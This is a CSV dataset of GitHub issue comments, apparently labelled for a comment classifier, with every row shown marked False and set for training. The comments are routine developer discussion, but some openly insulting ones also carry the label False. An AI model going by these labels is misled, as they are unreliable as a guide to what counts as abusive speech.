_id,issue_id,text,label,training
bootstrap/twbs/3057/5136392,bootstrap/twbs/3057,Zzzzing! ,False,True
serverless-stack-com/AnomalyInnovations/63/297448246,serverless-stack-com/AnomalyInnovations/63,"@friend I was able to resolve the issue above, however, when I opened the webpage and tried to log in I get an error message TypeError re is not a function. Am I missing anything? ",False,True
dataverse/IQSS/1513/237353352,dataverse/IQSS/1513,Today @friend @friend @friend and I discussed IP groups and I've been asked to try to reproduce this bug in the branch that pull request #3103 is based on. It's believed this is still a bug. ,False,True
rails/rails/33677/414875618,rails/rails/33677," etymology is quite important. in the end, we might consider plain words „black“ and „white“ racist and enter the realms of newspeak which i figure you especially, @friend, are familiar with.  “allow/deny are simply clearer terms” — now that’s an actual, technically useful argument.  can we please stop jumping onto political bandwagons? i am here for the sanity.   ",False,True
CoCEd/tmedwards/18/223763235,CoCEd/tmedwards/18,"Error as follows- [CoCEd 1.3.1.28497, CoC Data 1.0.2_v+_03] System.NullReferenceException Object reference not set to an instance of an object.    at CoCEd.ViewModel.ItemSlotVM.get_Type() in C\Users\tmedwards\Documents\Visual Studio 2015\Projects\CoCEd\CoCEd\ViewModel\ItemVM.csline 109    at CoCEd.ViewModel.GameVM..ctor(AmfFile file, GameVM previousVM, Boolean isRevampMod) in C\Users\tmedwards\Documents\Visual Studio 2015\Projects\CoCEd\CoCEd\ViewModel\GameVM.csline 166    at CoCEd.ViewModel.VM.Load(String path, SerializationFormat expectedFormat, Boolean createBackup) in C\Users\tmedwards\Documents\Visual Studio 2015\Projects\CoCEd\CoCEd\ViewModel\VM.csline 127    at System.Windows.EventRoute.InvokeHandlersImpl(Object source, RoutedEventArgs args, Boolean reRaised)    at System.Windows.UIElement.RaiseEventImpl(DependencyObject sender, RoutedEventArgs args)    at System.Windows.Controls.MenuItem.InvokeClickAfterRender(Object arg)    at System.Windows.Threading.ExceptionWrapper.InternalRealCall(Delegate callback, Object args, Int32 numArgs)    at MS.Internal.Threading.ExceptionFilterHelper.TryCatchWhen(Object source, Delegate method, Object args, Int32 numArgs, Delegate catchHandler) ",False,True
rdpwrap/stascorp/611/446715035,rdpwrap/stascorp/611,"…..  I just have a „Feeling“,  when the OS win10 1809 update Story is calming down ,        we will be lucky getting an update.     Probably @friend knows more &amp; better.  …. Meanwhile we may live with this intermediate solution. a) Os update CU 1809-17763-194 (KB4471332) using  b) the suitable data for 10.0.17763.168 (termsrv.dll file version) Von StarfighterJ Gesendet Mittwoch, 12. Dezember 2018 2018 hajubu ?( You also may wait till we get an updated rdpwrap.ini from binarymaster in the repository ) is this going to be done around 18 December 2018 you think. ",False,True
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/400878634,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183,"My apologies for breaking your code of conduct. I too am disheartened.  I have put many of my free hours into giving students feedback.  I grew fond, perhaps too fond, of the old Exercism site perhaps because it was not like other web sites. If this is beta testing then the features from the old site that I appreciated so much have been omitted by design and are not coming back. There are two core things I need to be able to do to mentor, everything else is nice to have.  I need to be able to read the submission and I need to be able to write, spell check, review and edit my comments over and over. I promised myself I would try mentoring on your new site.  I expect, as with other web sites, I will spend most of my time working in a text editor and copying/pasting to/from the finished GUI.  That would be a great shame. ",False,True
i2cdevlib/jrowberg/252/312037149,i2cdevlib/jrowberg/252,"HI @friend, This is exactly the problem that nobody can explain (so far). I don't think this is true. The issue seems to concern the MPU's behavior when the DMP is in use. By all accounts, the fact that it works perfectly when you use native Wire API calls to get raw data but it randomly freezes when using I2Cdevlib code to use the DMP is not because you're using I2Cdevlib code in the failing case, but rather because you are using the DMP in the failing case. I fully expect that if you did test the getMotion6 example with your hardware, it would work fine. Likewise, if you mimic the DMP initialization routine yourself using Wire and not I2Cdevlib, and then read DMP packets from the FIFO also using Wire and not I2Cdevlib, I expect your hardware will fail the same as it is doing now. It may be worth rolling my own I2C/TWI implementation with timeout support, or switching the underlying implementation to something like NBWire. However, I'm not sure it is worth spending a lot of time specifically troubleshooting a case that only appears to occur with clone Arduino or especially clone MPU parts. If the problem originates inside the MPU, then there is no guarantee that we could fix it even if we could detect it and avoid a blocking case. That would, at least, allow triggering an MPU reset instead of just freezing the entire CPU though. ",False,True
zfs/zfsonlinux/7960/445478342,zfs/zfsonlinux/7960,"Hi, I just saw this. I will let someone know so a PR can be opened, meanwhile I had some other fixes written for a few other spots that need testing. ",False,True
nav/UNINETT/142/276003177,nav/UNINETT/142,Translated changeset references  af565bebac1a9f2893395f63a27249c6fe809652 ,False,True
core/owncloud/27775/301239630,core/owncloud/27775,Same problem for me too. I've tried apt-get clean &amp; apt-get autoclean and their apt versions. None seems to clear things out so it pull down v9 latest. This is on Ubuntu Server 16.04 ,False,True
freeCodeCamp/freeCodeCamp/10163/253330522,freeCodeCamp/freeCodeCamp/10163,I'll take a stab at this assuming we still plan to have MDN links on the site. ,False,True
ursa/quartzjer/73/74277073,ursa/quartzjer/73,I can confirm that this is working on io.js v1.2.0 ,False,True
ansible/ansible/13262/234977800,ansible/ansible/13262,"Hi, with the following setup it works if i setup serial1 Otherwise it will run ""VLAN on interfaces"" for host B about a configline of host A with an unsettled int. I can't understand that behaviour and how prevent it. Thanks ",False,True
bootstrap/twbs/8019/18639960,bootstrap/twbs/8019,"No, I never assumed malice. I'm sure there were some issues that I hadn't considered. But it's been a big effort fixing my site after that last update and I simply couldn't make sense of this one. Glad to see you've seen the light. ;) Thanks. ",False,True
react-styleguidist/styleguidist/1110/354755295,react-styleguidist/styleguidist/1110,"I've searched the docs, issues, and Stack Overflow for an answer to this, but I cannot find the answer. How do you enable Hot Module Reloading? ",False,True
bootstrap/twbs/24475/441238128,bootstrap/twbs/24475," It's already been decided internally to move to Hugo by all members. So, it's a matter of how easily we can solve the issues and the switch will happen ASAP ) Thanks! I'd love to be able to use such thing without the extra shortcode, but that'll do, at least for one var in the link.  ",False,True
tickettest1/kbower/2770/268486806,tickettest1/kbower/2770,"rneville trac status change on Dec 24, 2015, 65049 AM closed ",False,True
bootstrap/twbs/3057/5140572,bootstrap/twbs/3057,@friend Telling developers who are legitimately trying to use your code that they just dont know how to use semi-colons and that everyone else needs to work around their coding style is wrong in the open source world. It's about working together not trying to boost your ego. ,False,True
SickChill/SickChill/5159/441364887,SickChill/SickChill/5159,"It's great having certs if exposed to the internet, though my server is internal only and I'm presently only using http. Will this be forced on to me? Self signed certs are annoying, so it would ultimately force me to setup domain name and potentially open it up to the internet (if only briefly to get the cert). Don't get me wrong, I love this idea and switch 2fa on for everything I can. Though I would like it to be optional. Thanks everyone who helping out with the code, I love this service ",False,True
piwik/piwik/3405/48309549,piwik/piwik/3405,"Will it work if archive.php is launched on different servers but for the ""same"" database ? ",False,True
leveldb/google/519/343001715,leveldb/google/519,"@friend All the Window APIs are the Unicode versions. Currently, I use  for files and directories, but that is easily changed. As for , unfortunately it somewhat raises a chicken/egg problem. ",False,True
hyrise/hyrise/1602/495653397,hyrise/hyrise/1602,"Ah, forgot about this. I'm trying to step back a bit from tackling ""small"" issues. I think it's better if the new forces start working on these things, to gain some experience with Hyrise. ",False,True
angular.js/angular/1463/12869100,angular.js/angular/1463,@friend plus one I think it is a small number of users that this impacts and allows for flexibility unlike service APIs such as the one mentioned above that tend to be near impossible to change. ,False,True
Skript/SkriptLang/1568/425499316,Skript/SkriptLang/1568,"The error indicates ""Bukkit 1.8.8-R0.1-SNAPSHOT 28.09 "" This fork of Skript does not support anything lower than 1.9 ",False,True
angular.js/angular/1463/18038679,angular.js/angular/1463,"I had the same problem (also using MongoDB on the backend) but it seems just manually stringifying the data/params prior to calling the $http service works, i.e. ",False,True
AssettoCorsaTools/zegreatclan/188/352294095,AssettoCorsaTools/zegreatclan/188, Add computed fuel strategy like F1 2017 = a value that shows if you can finish the race and helps you knowing if you have to fuel save or not   ,False,True
minecraft-bugs/tryashtar/864/339511947,minecraft-bugs/tryashtar/864,"&lt;img src="" width=20 height=20&gt; [Mod] Kumasasa • Aug 8, 2014 bq. OpenGL AMD Radeon HD 7660G GL version 4.4.12874 Compatibility Profile Context 14.100.0.0, ATI Technologies Inc. You don't know what driver version you had prior to this ? ",False,True
react-popper/FezVrasta/111/379496122,react-popper/FezVrasta/111,"@friend having done a lot of experimentation, I strongly believe that this issue needs to be re-opened. Ultimately, the combination of packages that I'm using (SharePoint Framework, React, React DOM, Reactstrap, FontAwesome and others), require that the webpack resolver modules paths contains , without this in the path for example it is absolutely impossible to include a FontAwesome icon in a Reactstrap button, because react throws errors that are not thrown otherwise. The ultimate fix is to use another name for your  file so that conflicts aren't an issue - changing configurations when those configuration changes are breaking changes for many other packages and package combinations isn't appropriate. ",False,True
normalizr/paularmstrong/358/428590214,normalizr/paularmstrong/358,Don't know use ? It'll create a commit with a new version for  + a git tag. ,False,True
manageiq/ManageIQ/1210/66507476,manageiq/ManageIQ/1210,"Checked commit  with rubocop 0.27.1 1 file checked, 1 offense detected vmdb/spec/models/ems_refresh/refreshers/vc_refresher_spec.rb  [ ] Warn - Line 28, Col 1 - Lint/BlockAlignment -  at 28, 0 is not aligned with  at 14, 2  ",False,True
primitive/haskell/71/353574170,primitive/haskell/71,"I would very much appreciate a Hackage release working with GHC 8.4.1 alpha, too.  has a lot of reverse dependencies (224 direct ones), even more if you consider them transitively. As a consequence, quite a few popular packages like  are broken right now with 8.4.1. I don't think it's a sensible solution to tell hundreds of dependent projects ""Hey, just fiddle around with your CI scripts..."". ;-)  is very near to the bottom of the whole Hackage dependecy tree, so it would be a pity if it delayed tons of other projects. IMHO the whole point of the GHC alpha releases is to fix such breakage early, so we have a healthy ecosystem when the final release comes out. ",False,True
bootstrap/twbs/3057/5137638,bootstrap/twbs/3057,@friend I believe he's talking about putting the ! in front of that code. ,False,True
bootstrap/twbs/3057/5329618,bootstrap/twbs/3057,If you're still reading this.. you really should go out and PLAY! ,False,True
ceph/ceph/12105/263315944,ceph/ceph/12105,"@friend I spent some time experimenting with a switch statement like this but I ran into problems because libcurl will add a  header to these POST requests - and because  is part of the s3 signature, this breaks the authentication we only generate POST requests for  and , so I tried passing this header in explicitly - but it got pretty messy, and I'm not sure the refactoring is worth it at this point when the fix in this PR is so much simpler. what do you think? ",False,True
jekyll/jekyll/6948/386798575,jekyll/jekyll/6948,@friend my bad. guess i misfired with backgrounds as well? ,False,True
bootstrap/twbs/3057/5138067,bootstrap/twbs/3057,"@friend This means deploying your version of JSMin on all my systems, plus ensuring your version is in sync with upstream JSMin. Why can't we instead just replace all  with  in Bootstrap? It's easier and doesn't affect production environments. ",False,True
ansible/ansible/13262/335316696,ansible/ansible/13262,"@friend looping over includes forces you to break out of the current logic and context-switch when writing or updating playbooks, which isn't always ideal. We are aware of the ability to loop overs includes, but would prefer to be able to loop over blocks if we choose. Closing your most popular (by far) feature request as wontfix is pretty disappointing. ",False,True
opencv/opencv/12198/412452375,opencv/opencv/12198,"plus one for @friend  I'm not english fluent, so it's difficult for me to understand everything around legal in the Intel documents, but I share @friend feeling, and I completely agree with his request. FYI, I myself wanted to use Intel software with my students, when I discovered the legal nightmare Intel introduces when using such resources. The project has been canceled, and we use other solutions (OpenCV is still in the list, of course). For OpenCV credibility, Intel Vino engine shouldn't be included nor associated to OpenCV image. Maybe as ""contrib, but I'm not completely sure. My 2 cents --  ericb ",False,True
composer/composer/7764/435060118,composer/composer/7764,"Please do not post ""me too"" comments if you aren't going to provide any additional information. It spams everyone ands makes it harder to find help in this thread. To resolve this make sure you remove symfony/symfony or the other symfony components depending on your app's requirements. e.g.  states that those two are incompatible, you have to find a way to remove either of them, which might involve upgrading/downgrading the other. ",False,True
vuejs.org/vuejs/974/313585298,vuejs.org/vuejs/974,Thanks @friend! @friend ^^^ ,False,True
zfs/zfsonlinux/7401/379559299,zfs/zfsonlinux/7401,"BTW, I bisected it, and couldn't repro it on CentOS 7 with 3.10.0-693.21.1 on eb9c453 but could on cc63068, so that does appear to be the cause. ",False,True
bootstrap/twbs/7482/15982871,bootstrap/twbs/7482,"You don't care about what the spec says? Don't you think you have a duty to promote good practices and proper use of tags rather than the complete opposite? On 5 Apr 2013 2314, ""Mark Otto"" notifications@friend.com wrote ",False,True
Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942/286971126,Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942,"OS Windows 10 (don't think OS matters here) Issue Descriptions 2334 for #2224 via the ""keep sidebar open"" option created a usability issue with having two identical menus visible.  Google's web player has both of these menus, but doesn't have this issue because it's there's no option to keep the hamburger menu expanded or sidebar open. If I choose to keep the sidebar open, then the other menu should not be visible, but being that it looks like that is part of the google play web page, I don't think that is a feasible option here. I think that you should change this behavior back to mirror exactly as google designed it with only one of these menus visible at a time.  ",False,True
find-and-replace/atom/322/66220653,find-and-replace/atom/322,It was intentional. Very very few people click that button. You can use the keyboard shortcut  instead. ,False,True
framework/laravel/25212/350715197,framework/laravel/25212,"Example Compiles to What it SHOULD compile to It's supposed to be passing 512 as the 3rd argument into  instead of the 2nd argument which acts to disable several defaults such as JSON_HEX_APOS and JSON_HEX_QUOT. When going beyond a single key in your JSON/array, the directive will pick up the commas within the array declaration and interpret them as arguments for   due to its use of (Note If you test with 3 keys instead of 2, it will produce a valid json_encode call, but will be missing the 2nd and 3rd parameters) Problematic code  ",False,True
ansible/ansible/13262/329229007,ansible/ansible/13262,"As @friend pointed out, the loops could be simply lifted into the tasks within the block with a little processing to merge block level loops and task level loops.  This would negate any performance benefits, but the readability/writability improvements are probably worth it by themselves. ",False,True
eXpand/eXpandFramework/176/425667573,eXpand/eXpandFramework/176,"sure it relates but lets discuss #175 separately is too complex task and we need a smart solution, Feel free to update your suggestion if you have ideas. N1 looks like #185 we can introduce a new field FailWhenNotFound perhaps?? because the  applies to the main object type and cannot be used again. ",False,True
declarative-lookup-rollup-summaries/afawcett/149/89514865,declarative-lookup-rollup-summaries/afawcett/149,See more info here ,False,True
Skript/SkriptLang/1568/425498881,Skript/SkriptLang/1568,"Use hastebin or pastebin for errors, because it's pretty hard to read right now. Also, why set the args as , when you can just make a command without args using♠command /die` Stack trace (roughly) for solving the issue ",False,True
bootstrap/twbs/3057/5139323,bootstrap/twbs/3057,"Like mentioning in the INSTALL or README that th script MAY NOT be compatible with this or that minifier. Would sound like a compromise solution to all three parties -- the Bootstarp,the JSmin and some developper. But it isn't. Have to keep my own readme.txt for every library with notes upon their potential bad behavior then implementing into production. ",False,True
rdpwrap/stascorp/645/458502955,rdpwrap/stascorp/645,@friend can you clarify witch Win10 version do you have? Pro or Home?  Win10 Pro 1809 (OS Build 17763.292) and in my RDP folder .dll is not created ( ,False,True
bootstrap/twbs/3057/5170439,bootstrap/twbs/3057,"The question is, what do we lose if we ended this infinite argument and added a single character that would make thousands of developers happy? Bandwidth or pride? ",False,True
bootstrap/twbs/3057/5466944,bootstrap/twbs/3057,The drama of this Github thread has now been forever immortalized. ,False,True
cerberus/NEU-Libraries/692/83738791,cerberus/NEU-Libraries/692,"Still nothing in the logs, and without further information, hard to determine what the issue is. I could try replicating it if you make the file available somewhere I suppose. ",False,True
documentation/nextcloud/1142/455350523,documentation/nextcloud/1142,And another one could you run  and show the output? And then run  and show the output as well? ,False,True
fullcalendar/fullcalendar/3046/133451980,fullcalendar/fullcalendar/3046,"Events in the first day, WITH END datetime set, are NOT displayed with defaultView 'agendaWeek'. This just happens in the first day, even if you change the ""firstDay"" parameter. If you click on Month View and go back to Week View, those ""hidden"" events are displayed. To verify it, just add in the following changes in the JSON example included in the download files JSON.HTML header { left 'prev,next today', center 'title', right 'month,agendaWeek,agendaDay' }, defaultView 'agendaWeek', EVENTS.JSON   {     ""title"" ""MY HIDDEN TITLE"",     ""start"" ""2016-01-10T103000-0500"",     ""end"" ""2016-01-10T123000-0500""   }, Then, try the same deleting the ""END"" line from events.json file, refresh the page, and the event will be displayed Obviously, this will happen replacing json file with a database module. Any idea to solve this? ",False,True
Carthage/Carthage/2529/409582986,Carthage/Carthage/2529,"I think it might make more sense to explicitly list schemes that you are using if we really want to do this If no schemes are listed, then all would be built. This seems like it's more inline with with SwiftPM does, which would let us move more towards it in the future. It also solves the issue where schemes aren't tied to dependencies. The biggest issue would be to find the correct file format. OGDL was been suggested in the past. That might make sense here if we're going to extend. ",False,True
linq2db/linq2db/1490/394136801,linq2db/linq2db/1490,"After upgrade ling2db to version 2.6 t4 template start generating ""Find"" extension method with number suffix like this ",False,True
Semantic-UI-React/Semantic-Org/2550/391949560,Semantic-UI-React/Semantic-Org/2550,currently compatible only with . ,False,True
react-popper/FezVrasta/111/379499802,react-popper/FezVrasta/111,"How about we balance your hourly rate with the several hundred hours I've already expended on this problem at my hourly rate?! Or, better yet, how about you spend the 45 seconds it would take you to fix the issue! ",False,True
NanoCore/NanoAdblocker/87/356469661,NanoCore/NanoAdblocker/87,mayby quick access to off specific rule on single site example.  ,False,True
bootstrap/twbs/3057/5168997,bootstrap/twbs/3057,"@friend You were just trying to score geek cred by talking down someone who is clearly much smarter than you. He was accurate and to-the-point. It's kind of sad to see so many clueless hipsters like yourself masquerading as serious software developers and desperately trying to be taken seriously. Instead of acknowledging and improving upon what people like Crockford have built, you seem to prefer bikeshedding and picking apart trivial crap like this to make yourself feel relevant. ",False,True
serverless-stack-com/AnomalyInnovations/63/359599203,serverless-stack-com/AnomalyInnovations/63,I figured it out -- I ran a few of the npm install scripts in my root directory as opposed to my working directory. never mind! ,False,True
Ant-Media-Server/ant-media/579/441609766,Ant-Media-Server/ant-media/579,"@friend thank you for your answer, which raises some concerns. I understand that people need to earn a living, hence the community/enterprise edition split. However, in most if not all projects, the community edition implement the core features that are absolutely mandatory, while the enterprise edition add extra features that are needed for more advanced use cases or bigger installations. The way I understand it, a basic media streaming server allows  One user to publish a stream Everyone to receive a stream  Item 1 is simply not available in the community edition, since everyone can actually publish on any stream. In some cases, additional security is an extra feature, but that's not true here having an even basic restriction on who can publish on a given stream is part of the core use case. Without that, the software is actually dangerous to use for any real-world stream! Let me take a concrete example showing how bad it could be. Alice has a video game a stream on an Ant Media Server (Community edition), with some young viewers in the audience. Alice's streams are completely safe for any audience. But one day, for fun, someone decides to hijack Alice's stream and broadcast porn instead. They can do that in literally 1 minute, by simply examining the Stream URL in the page source and firing up OBS. Alice looses her audience, reputation, and can even be sued by angry parents. Knowing that publishing is left completely open, I don't understand why anyone would use the Community edition of Ant Media. The attack surface and risks are just too big. I sincerely think publishing should be protected by default in the community edition, and I hope that you'll consider that for the safety of viewers and streamers on your platform. ",False,True
nativefier/jiahaog/29/181408184,nativefier/jiahaog/29,plus one for this. Find is something I use a lot in most web apps I use. ,False,True
cdnjs/cdnjs/13175/449974590,cdnjs/cdnjs/13175, another 404 ,False,True
rails/rails/1917/1475302,rails/rails/1917,Why are you closing this issue? This is a serious problem and it was not fixed. Since when is it OK for Rails to have docs that are misleading and completely out of date? ,False,True
npm/npm/21202/340599374,npm/npm/21202,"Please see the following issue  3.7.2 has been published an hour ago which is a hacked version that steals the NPM accounts or something. Please pull the version 3.7.2 from the npm and freeze the account so this does not get propagated. As a matter of fact, there is no release tag for 3.7.2 on Github, so I think it would be great to consider double checking with Github repository before publishing. This would at least limit the possibility of uploading the viruses to NPM without having Github credentials to tag the version. ",False,True
zfs/zfsonlinux/7401/379552009,zfs/zfsonlinux/7401,"Greetings, I have mirrors with the same problem. Scientific Linux 7.4 (fully updated) zfs-0.7.7 from zfsonlinux.org repos The output of my yum install I am using rsnapshot to do backups. It is when it runs the equivalent to below that issues come up. There's plenty of space For those that want to know my hardware, the system is a AMD X2 255 processor with 8GB of memory (so far more than enough for my home backup system). I can revert today, or I can help test if someone needs me to try something. Just let me know. Thanks! ",False,True
node-re2/uhop/49/498569440,node-re2/uhop/49,"I did try with  (which is the most recent version at time of writing) which did yield the errors above. In case you opt for the N-API rewrite I'd be grateful if we could chat and see where I might be of use, so you don't have to tackle the whole thing alone 🙂 Kinda curious to explore more in this area ",False,True
officer/davidgohel/141/401162077,officer/davidgohel/141,"@friend Serge Nosov, you spent few minutes downvoting all my SO answers ) &lt;img width=""794"" alt=""capture d ecran 2018-06-28 a 21 57 12"" src="" you replied to yourself with a wrong answer! . &lt;img width=""689"" alt=""capture d ecran 2018-06-28 a 21 59 16"" src="" function you want to use is only working when the document is edited in Word. I am working with MacOS and have no issue when opening the document in Word. ",False,True
zfs/zfsonlinux/8259/496714988,zfs/zfsonlinux/8259,Looks like the kernel people may have backported their patch to older kernels ,False,True
react/facebook/7245/231700664,react/facebook/7245,"@friend Do you think we’ll get #7178 in this week? If yes, maybe we don’t need to bother with this fix. ",False,True
rails/rails/1917/1477550,rails/rails/1917,"You knew that someone would fix it and that's why you have closed it? I thought it works a bit differently, first someone fixes it, then you close the issue ^^ I think it is a serious problem if people are loosing days of work because of it, and if you look at the links posted above by paneq I'm not the only one affected by this. I also pointed out a specific, technical defect with the changes that were made which you have chosen to completely ignore. ",False,True
khan-exercises/Khan/80851/20004257,khan-exercises/Khan/80851,"It doesn't specify that Daniel doesn't eat any himself. That means that the answer could be 8 OR 9, and both are choices. dividing_fractions_word_problems.html?seed=156&amp;problem=candy Answer timeline [""8""]  User hash 476603756 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36 MathJax is loaded, ready, queue length 0 start of log loadModule mod /khan-exercises/utils/answer-types.js loadModule mod /khan-exercises/utils/tmpl.js loadModule mod /khan-exercises/utils/tex.js loadModule mod /khan-exercises/utils/jquery.adhesion.js loadModule mod /khan-exercises/utils/calculator.js loadModule mod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadScript loading /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 startTask... startTask got task undefined loadScript loaded /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise start significant_figures_1.html loading and rendering ratio_word_problems loadExercise start ratio_word_problems.html loadExercise got significant_figures_1.html loadExercise submod math loadModule mod /khan-exercises/utils/math.js loadModule mod /khan-exercises/utils/raphael.js loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish significant_figures_1.html loadExercise got ratio_word_problems.html loadExercise submod math loadExercise submod math-format loadModule mod /khan-exercises/utils/math-format.js loadModule mod /khan-exercises/utils/expressions.js loadExercise submod word-problems loadModule mod /khan-exercises/utils/word-problems.js loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish ratio_word_problems.html loaded ratio_word_problems, now rendering loadModule mod /khan-exercises/utils/scratchpad.js start of makeProblem chose problem type and seed for ratio_word_problems cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) validator created MathJax done typesetting (10) MathJax done typesetting (5) MathJax done typesetting (20) loading and rendering significant_figures_1 loaded significant_figures_1, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for significant_figures_1 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (132) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) done with runModules decided on answer type number validator created startTask... startTask got task solving_for_the_y-intercept renderExerciseTask solving_for_the_y-intercept loading and rendering solving_for_the_y-intercept loadExercise start solving_for_the_y-intercept.html loadExercise got solving_for_the_y-intercept.html loadExercise submod math loadExercise submod graphie loadModule mod /khan-exercises/utils/graphie.js loadExercise submod math-format loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish solving_for_the_y-intercept.html loaded solving_for_the_y-intercept, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for solving_for_the_y-intercept cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting ((8, -7)) MathJax done typesetting (y = -\dfrac{6}{5} x + b) MathJax done typesetting (y) MathJax done typesetting (b) MathJax done typesetting (b =) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (b =) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) validator created MathJax done typesetting (b =) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (6) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (3/5) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src 